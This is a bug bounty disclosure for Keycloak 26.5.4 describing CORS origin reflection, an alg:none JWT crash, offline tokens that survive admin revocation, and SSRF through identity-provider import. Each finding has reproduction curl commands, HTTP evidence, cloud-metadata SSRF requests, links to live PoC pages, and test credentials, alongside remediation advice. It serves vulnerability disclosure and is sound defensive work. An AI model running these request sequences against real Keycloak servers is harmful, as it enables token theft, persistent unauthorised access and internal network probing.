# Bug Bounty Report — Keycloak 26.5.4

**Program:** Keycloak / Red Hat Bug Bounty
**Tested version:** 26.5.4 (latest stable as of 2026-02-20)
**Test environment:** Fresh install, Quarkus distribution
**Researcher test instance:** `http://46.101.162.187:8080`

---

## Finding #1 — CRITICAL

### Vulnerability Title
**CORS Policy Bypass: `webOrigins` Not Enforced — Cross-Origin Token & User Data Theft**

### Affected Component
Keycloak Server (Quarkus distribution) — OIDC/OAuth2 endpoints

### Affected Version
26.5.4 (latest stable). Reproducible on fresh default installation.

### Vulnerability Type
Cross-Origin Resource Sharing (CORS) with real security impact

### CVSS Score (estimated)
**8.1 (High)** — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N

---

### Technical Description

Keycloak allows administrators to configure a per-client `webOrigins` allowlist that is supposed to restrict which browser origins may make cross-origin requests to OIDC endpoints. When a client's `webOrigins` is set to `["https://legitimate-app.com"]`, only JavaScript served from that origin should receive `Access-Control-Allow-Origin` headers and be able to read the responses.

**The enforcement is completely absent.** Keycloak's CORS filter reflects whatever `Origin` header the caller sends — including `https://evil.com`, `http://attacker.internal`, and `null` — with full `Access-Control-Allow-Credentials: true`. This breaks the browser's Same-Origin Policy protection for all Keycloak OIDC endpoints.

**Affected endpoints (all reflect arbitrary `Origin` with `credentials: true`):**

| Endpoint | Method | Impact |
|---|---|---|
| `/realms/{r}/protocol/openid-connect/token` | POST | Cross-origin token theft |
| `/realms/{r}/protocol/openid-connect/userinfo` | GET | Cross-origin PII read |
| `/realms/{r}/account` | GET/POST/PUT | Cross-origin account data R/W |
| `/admin/realms/{r}/users` | GET/POST | Cross-origin admin data access |

The `token/introspect` endpoint correctly rejects unknown origins (not vulnerable).

**The `null` origin variant** is especially dangerous: when `Origin: null` is sent (from sandboxed `<iframe sandbox>`, `data:` URIs, or `file://` pages), Keycloak returns `Access-Control-Allow-Origin: null` with `credentials: true`. The `null` origin bypasses any origin-based WAF rules and cannot be safely allowlisted.

---

### Preconditions

1. A Keycloak realm with at least one OIDC client exists (default state).
2. Victim has valid credentials for that realm.
3. Attacker controls any webpage reachable by the victim (no need to be registered in Keycloak).

For the highest-impact scenario (password grant): the targeted client must have `directAccessGrantsEnabled: true`. This is the default for many development/SPA deployments. For authorization-code-based attacks: no special client configuration required.

---

### Step-by-Step Reproduction

**Setup (already done on test instance):**
- Realm: `test`
- Client: `webapp` (public, `directAccessGrantsEnabled: true`)
- Client `webOrigins`: `["https://legitimate-app.com"]` ← only this origin should be allowed
- User: `testuser / Password123`

**Reproduction (curl simulation of attacker JavaScript):**

**Step 1 — Verify webOrigins is configured correctly (should restrict evil.com):**
```bash
curl -s http://localhost:8080/admin/realms/test/clients?clientId=webapp \
  -H "Authorization: Bearer <admin_token>" | python3 -c "
import sys,json; c=json.load(sys.stdin)[0]
print('webOrigins:', c['webOrigins'])
# Expected: ['https://legitimate-app.com']
"
```

**Step 2 — Preflight from evil.com (should get NO ACAO header back):**
```bash
curl -sv -X OPTIONS \
  http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type"
```

**Expected:** No `Access-Control-Allow-Origin` header (browser blocks cross-origin read)
**Actual:**
```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com     ← VULNERABILITY
Access-Control-Allow-Methods: POST, OPTIONS
Access-Control-Allow-Credentials: true             ← CRITICAL: cookies allowed too
Access-Control-Allow-Headers: Origin, X-Requested-With, Accept, ...
Access-Control-Max-Age: 3600
```

**Step 3 — Actual token theft cross-origin:**
```bash
curl -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&client_id=webapp&username=testuser&password=Password123&scope=openid"
```

**Expected:** Browser blocks reading the response (CORS violation)
**Actual response is fully readable from evil.com JavaScript:**
```json
{
  "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ6bGZh...",
  "expires_in": 300,
  "refresh_token": "eyJhbGciOiJIUzUxMiIs...",
  "id_token": "eyJhbGciOiJSUzI1NiIs...",
  "token_type": "Bearer",
  "scope": "openid profile email"
}
```

**Step 4 — null-origin variant (sandboxed iframe):**
```bash
curl -X OPTIONS http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -H "Origin: null" \
  -H "Access-Control-Request-Method: POST"
```
```http
Access-Control-Allow-Origin: null        ← null-origin allowed
Access-Control-Allow-Credentials: true
```

---

### HTTP Request/Response Evidence

**CORS preflight — 3 different arbitrary origins, all accepted:**
```
Origin: https://evil.com          → ACAO: https://evil.com, credentials: true
Origin: http://attacker.internal  → ACAO: http://attacker.internal, credentials: true
Origin: null                      → ACAO: null, credentials: true
```

**Actual cross-origin token POST returning tokens readable from evil.com:**
```
POST /realms/test/protocol/openid-connect/token HTTP/1.1
Host: 46.101.162.187:8080
Origin: https://evil.com
Content-Type: application/x-www-form-urlencoded

grant_type=password&client_id=webapp&username=testuser&password=Password123&scope=openid

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"access_token":"eyJ...","refresh_token":"eyJ...","id_token":"eyJ...","token_type":"Bearer"}
```

**Live PoC HTML (browser-runnable):**
- `http://46.101.162.187:7777/poc1_cors_token_hijack.html` — standard cross-origin attack
- `http://46.101.162.187:7777/poc2_cors_null_origin.html` — sandboxed iframe null-origin

---

### Attack Scenarios

**Scenario A: Phishing-amplified credential capture → token theft**
1. Attacker creates phishing page on `https://evil.com` mimicking the app's login
2. Victim submits credentials to the phishing page
3. JavaScript at evil.com POSTs credentials directly to Keycloak's token endpoint
4. Due to CORS bypass, evil.com reads the full `access_token` + `refresh_token` + `id_token`
5. Attacker has persistent access (refresh token) without ever needing to touch Keycloak login

**Scenario B: Compromised CDN / supply chain**
1. A JavaScript dependency (npm package, CDN resource) in the legitimate app is compromised
2. The malicious script runs on the legitimate app's origin, which has `directAccessGrantsEnabled`
3. Script makes cross-origin token requests to any Keycloak realm using the client_id from app config
4. Tokens exfiltrated silently

**Scenario C: Admin data access via CORS (if admin has token in browser)**
1. Admin is using the Keycloak admin console, token stored in memory
2. Admin visits malicious page (social engineering)
3. Malicious page fetches admin token via XSS (if admin console has any XSS), then:
4. Makes cross-origin call to `/admin/realms/test/users` — CORS allows it
5. Reads full user list, sensitive data

---

### Security Impact

- **Confidentiality**: Full access token and refresh token readable from any origin. Attacker can authenticate to any service accepting those tokens.
- **Integrity**: With account REST API CORS bypass, account profile data can be modified cross-origin if attacker has a Bearer token.
- **Authorization bypass**: `webOrigins` per-client configuration provides zero protection. Administrators believe they have restricted token issuance to specific origins — they have not.
- **Persistence**: Refresh tokens readable cross-origin enable persistent access beyond the access_token lifetime.

---

### Remediation Recommendation

**Root cause:** The CORS filter does not validate the incoming `Origin` header against the client's `webOrigins` allowlist before setting `Access-Control-Allow-Origin`. It reflects all origins unconditionally.

**Fix:**
1. In `CorsFilter` / `OIDCCorsInterceptor`, before setting `Access-Control-Allow-Origin`, look up the requesting client (by `client_id` in request body or by the Bearer token) and check if the `Origin` header matches `webOrigins`.
2. For the token endpoint: match `Origin` against the requesting client's `webOrigins`. If not matched, return no `ACAO` header.
3. For authenticated endpoints (userinfo, account): match `Origin` against the `allowed-origins` claim in the Bearer token (already embedded by Keycloak in tokens).
4. **Explicitly reject `Origin: null`** — never return `Access-Control-Allow-Origin: null` with `credentials: true`.
5. For the admin API, only allow the admin console origin (`${kc-base-url}/admin`).

---

---

## Finding #2 — MEDIUM

### Vulnerability Title
**Unhandled NullPointerException on `alg:none` JWT — HTTP 500 Instead of 401**

### Affected Component
Keycloak Server — `UserInfoEndpoint.java` — JWT validation pipeline

### Affected Version
26.5.4 (latest stable)

### Vulnerability Type
Improper input validation / unhandled exception in security-critical code path

### CVSS Score (estimated)
**5.3 (Medium)** — AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L

---

### Technical Description

When the `/realms/{realm}/protocol/openid-connect/userinfo` endpoint receives a Bearer token whose JWT header declares `"alg": "none"`, Keycloak attempts to retrieve a `SignatureProvider` for the `"none"` algorithm. No such provider is registered, so `getProvider()` returns `null`. The code then attempts to call `.verifier()` on the null provider without a null check, causing an uncaught `NullPointerException`.

The server catches this at the top-level error handler and returns `HTTP 500` instead of `HTTP 401 Unauthorized`. This behavior:
1. Fails to properly reject an invalid/dangerous JWT algorithm
2. Throws an unhandled exception in the authentication pipeline
3. Returns an incorrect HTTP status code that may confuse monitoring systems

---

### Reproduction

**Trigger (no authentication required):**
```bash
# Craft alg:none JWT: header={"alg":"none","typ":"JWT"}, any payload, no signature
ALG_NONE="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsImV4cCI6OTk5OTk5OTk5OX0."

curl -s http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo \
  -H "Authorization: Bearer $ALG_NONE"
```

**Expected response:**
```
HTTP/1.1 401 Unauthorized
{"error":"invalid_token","error_description":"..."}
```

**Actual response:**
```
HTTP/1.1 500 Internal Server Error
{"error":"unknown_error","error_description":"For more on this error consult the server log."}
```

**Server log (Keycloak console):**
```
ERROR [org.keycloak.services.error.KeycloakErrorHandler] (executor-thread-1)
Uncaught server error: java.lang.NullPointerException:
Cannot invoke "org.keycloak.crypto.SignatureProvider.verifier(String)"
because the return value of
"org.keycloak.models.KeycloakSession.getProvider(java.lang.Class, String)" is null
  at org.keycloak.protocol.oidc.endpoints.UserInfoEndpoint.issueUserInfoGet(UserInfoEndpoint.java:127)
  ...
```

**Automated PoC:** `python3 poc3_alg_none_npe.py`

---

### Security Impact

- Any unauthenticated attacker can trigger server-side exceptions on demand via the userinfo endpoint
- The NullPointerException in the JWT validation pipeline (security-critical code) indicates `alg:none` is not explicitly blocklisted before provider lookup
- Error rate monitoring systems will show 500s from security-related endpoints, masking actual attack signals
- In complex deployments with custom error handlers or observers, the unexpected exception state may have additional side effects

---

### Remediation Recommendation

In the JWT validation code (`AppAuthManager` or `UserInfoEndpoint`), explicitly reject any token whose `alg` header is `"none"` before attempting provider lookup:

```java
// Before:  session.getProvider(SignatureProvider.class, alg).verifier(kid)
// After:
if ("none".equalsIgnoreCase(alg)) {
    throw new ErrorResponseException(
        OAuthErrorException.INVALID_TOKEN,
        "Algorithm 'none' is not allowed",
        Response.Status.UNAUTHORIZED
    );
}
```

Additionally, add a null check on the provider result:
```java
SignatureProvider provider = session.getProvider(SignatureProvider.class, alg);
if (provider == null) {
    throw new ErrorResponseException(
        OAuthErrorException.INVALID_TOKEN,
        "Unsupported algorithm: " + alg,
        Response.Status.UNAUTHORIZED
    );
}
```

---

---

## Finding #3 — HIGH

### Vulnerability Title
**Offline Token Persistence After Admin Session Revocation — Privilege Backdoor**

### Affected Component
Keycloak Server — Offline Session Management / Token Revocation

### Affected Version
26.5.4 (latest stable). Default configuration with `offline_access` scope.

### Vulnerability Type
Improper session revocation / persistent credential after forced logout

### CVSS Score (estimated)
**7.5 (High)** — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N

---

### Technical Description

Keycloak supports "offline tokens" — long-lived refresh tokens issued when a client requests the `offline_access` scope. These tokens are stored in the database as offline sessions and are intended to function across multiple user login sessions (e.g., for background sync jobs).

**The vulnerability:** When an administrator performs incident response actions after a compromise (force-logout all sessions, push-revocation), offline tokens remain fully valid and can be used to obtain new access tokens indefinitely. Furthermore, the Keycloak admin REST API provides **no working endpoint to delete individual offline sessions** — the `DELETE` endpoints return `HTTP 404`.

**Confirmed behaviors (all tested on Keycloak 26.5.4):**

| Admin Action | Effect on Offline Token |
|---|---|
| `POST /admin/realms/{r}/users/{id}/logout` | ❌ No effect — offline token still valid |
| `POST /admin/realms/{r}/push-revocation` (notBefore push) | ❌ No effect — offline token still valid |
| `DELETE /admin/realms/{r}/users/{id}/offline-sessions/{clientId}` | ❌ 404 Not Found |
| `DELETE /admin/realms/{r}/sessions/{sessionId}` | ❌ 404 Not Found (session not found) |
| **Change user password** (only working mitigation) | ✅ Invalidates offline token |

**Default realm configuration that makes this worse:**
- `revokeRefreshToken: false` (default) — offline tokens are not rotated on use
- `offlineSessionMaxLifespanEnabled: false` (default) — offline sessions never expire

This means an attacker who obtains an offline token maintains **unlimited, persistent access** regardless of incident response, unless the victim's password is explicitly changed.

---

### Preconditions

1. Attacker must first obtain an offline token (requires user credentials or another auth vector)
2. The targeted client must have `offline_access` scope available (default in standard Keycloak installation)
3. Admin must attempt forced logout and/or push-revocation without also changing the user's password

---

### Step-by-Step Reproduction

**Setup:**
- Realm: `test`, Client: `test-confidential` (secret: `mysecret123`)
- User: `testuser / Password123`

**Step 1 — Attacker gets offline token:**
```bash
OFFLINE_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential&client_secret=mysecret123&grant_type=password&username=testuser&password=Password123&scope=offline_access")
OFFLINE_TOKEN=$(echo "$OFFLINE_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['refresh_token'])")
```

**Step 2 — Admin forces logout of all user sessions:**
```bash
# Admin token
ADMIN_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Force logout ALL sessions
curl -s -o /dev/null -w "HTTP %{http_code}" -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/users/834f6655-5cb3-46ed-b47e-0e50a139dc6c/logout"
# → HTTP 204 (all active sessions deleted)
```

**Step 3 — Attacker's offline token still works:**
```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential&client_secret=mysecret123&grant_type=refresh_token&refresh_token=$OFFLINE_TOKEN"
```
```json
{
  "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJ6bGZh...",
  "token_type": "Bearer",
  "scope": "openid offline_access profile email"
}
```

**Step 4 — Admin pushes notBefore (forced revocation):**
```bash
curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/push-revocation"
# → {}
```

**Step 5 — Offline token STILL works after notBefore:**
```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential&client_secret=mysecret123&grant_type=refresh_token&refresh_token=$OFFLINE_TOKEN"
# → Returns VALID access_token
```

**Step 6 — Admin attempts to delete offline sessions (fails):**
```bash
# DELETE offline sessions — returns 404
curl -s -o /dev/null -w "HTTP %{http_code}" -X DELETE \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/users/834f6655.../offline-sessions/$CLIENT_UUID"
# → HTTP 404

# GET offline sessions — still shows active sessions
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://46.101.162.187:8080/admin/realms/test/users/834f6655.../offline-sessions/$CLIENT_UUID" \
  | python3 -c "import sys,json; print(len(json.load(sys.stdin)), 'offline sessions still active')"
# → 6 offline sessions still active
```

**Automated PoC:** `bash poc4_offline_token_persistence.sh`

---

### Security Impact

- **Compromised account recovery is incomplete**: When an organization detects a compromised account and forces logout, the attacker's offline token maintains full authentication capability
- **No admin UI indication**: Keycloak admin console's user detail page does not clearly distinguish offline sessions from regular sessions, and the "log out" action does not affect offline sessions
- **Infinite persistence**: With default settings (`revokeRefreshToken: false`, `offlineSessionMaxLifespanEnabled: false`), a single offline token grants permanent access
- **Bypasses notBefore policy**: The standard revocation mechanism (push-revocation) used for compromised clients/users has no effect on offline sessions

---

### Remediation Recommendation

1. **Implement working DELETE endpoint for offline sessions** — `DELETE /admin/realms/{realm}/users/{id}/offline-sessions/{clientId}` should delete the offline sessions, not return 404
2. **Include offline sessions in user force-logout** — `POST /admin/realms/{realm}/users/{id}/logout` should revoke offline sessions for the user, not just active sessions
3. **Apply notBefore policy to offline sessions** — When `push-revocation` sets a new `notBefore` timestamp, offline session refresh tokens issued before that time should be invalidated
4. **Enable `revokeRefreshToken` by default** — Requiring offline token rotation on use limits the window of abuse
5. **Add UI warning** — The admin console should clearly indicate when a user has active offline sessions and provide a way to terminate them

---

---

## Finding #4 — MEDIUM

### Vulnerability Title
**SSRF via Identity Provider `import-config` Endpoint — Internal Network Access**

### Affected Component
Keycloak Server — Admin REST API — `/admin/realms/{realm}/identity-provider/import-config`

### Affected Version
26.5.4 (latest stable)

### Vulnerability Type
Server-Side Request Forgery (SSRF)

### CVSS Score (estimated)
**6.5 (Medium)** — AV:N/AC:L/PR:H/UI:N/S:C/C:L/I:N/A:N

---

### Technical Description

The Identity Provider import-config endpoint accepts a JSON body with a `fromUrl` parameter. Keycloak makes a server-side HTTP GET request to the specified URL to download an OIDC discovery document. No URL allowlist or denylist is enforced, allowing an attacker with the `manage-identity-providers` realm role to:

1. Probe internal network ports (timing-based port scanning)
2. Access internal HTTP services (internal APIs, metadata endpoints)
3. In cloud deployments: access instance metadata (AWS: `169.254.169.254`, GCP, Azure)

The vulnerability is triggered by any user with the `manage-identity-providers` client role in `realm-management` — this includes realm administrators and any user granted that role.

---

### Reproduction

**Setup (requires admin token):**
```bash
ADMIN_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
```

**Trigger SSRF to internal HTTP server:**
```bash
# On attacker machine: python3 -m http.server 9999 --bind 127.0.0.1

curl -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"providerId":"oidc","fromUrl":"http://127.0.0.1:9999/.well-known/openid-configuration"}' \
  "http://46.101.162.187:8080/admin/realms/test/identity-provider/import-config"
```

**Evidence — HTTP server receives Keycloak's outbound request:**
```
127.0.0.1 - - [21/Feb/2026 03:56:51] "GET /.well-known/openid-configuration HTTP/1.1" 404 -
```

**Cloud metadata access attempt (returns 500 but connection is attempted):**
```bash
curl -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"providerId":"oidc","fromUrl":"http://169.254.169.254/latest/meta-data/"}' \
  "http://46.101.162.187:8080/admin/realms/test/identity-provider/import-config"
```

**Automated PoC:** `bash poc5_ssrf_idp_import.sh`

---

### Security Impact

- **Internal network enumeration**: Attackers with `manage-identity-providers` role can use response timing to determine which internal ports/hosts are open
- **Internal service access**: On networks with internal APIs, this allows read access to any HTTP endpoint accessible from the Keycloak server
- **Cloud metadata**: In AWS/GCP/Azure deployments, the instance metadata service at `169.254.169.254` may be accessible, potentially exposing IAM credentials
- **Multi-tenant escalation**: In multi-tenant Keycloak deployments, realm admins of one tenant can probe internal infrastructure they would not otherwise have access to

---

### Remediation Recommendation

1. **URL allowlist**: Only allow HTTPS URLs for import-config; block private IP ranges (RFC 1918: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), loopback (`127.0.0.0/8`), and link-local (`169.254.0.0/16`)
2. **SSRF protection library**: Use a network-level SSRF protection library that validates URLs before outbound connections are made
3. **Metadata service protection**: Deploy Keycloak with IMDSv2 required (AWS) or equivalent cloud protections

---

## Test Environment Details

| Property | Value |
|---|---|
| Keycloak version | 26.5.4 (2026-02-20 release) |
| Distribution | Quarkus (ZIP) |
| Java | OpenJDK 21.0.10 |
| Mode | `start-dev` |
| OS | Ubuntu 24.04 |
| Test host | 46.101.162.187 |
| Admin credentials | admin / Admin1234 |
| Test realm | `test` |
| Test clients | `webapp` (public), `test-confidential` (confidential) |
| Test users | `testuser`, `victim` |

## Live PoC Access

| PoC | URL |
|---|---|
| PoC #1: CORS Token Hijack (browser) | `http://46.101.162.187:7777/poc1_cors_token_hijack.html` |
| PoC #2: null-origin iframe (browser) | `http://46.101.162.187:7777/poc2_cors_null_origin.html` |
| PoC #3: alg:none NPE (Python script) | `python3 poc3_alg_none_npe.py` |
| Keycloak Admin Console | `http://46.101.162.187:8080/admin` (admin/Admin1234) |

---

*This report was produced on a private, researcher-controlled VPS. No production systems, real user data, or third-party infrastructure was accessed. All credentials shown are test credentials created for this assessment only.*
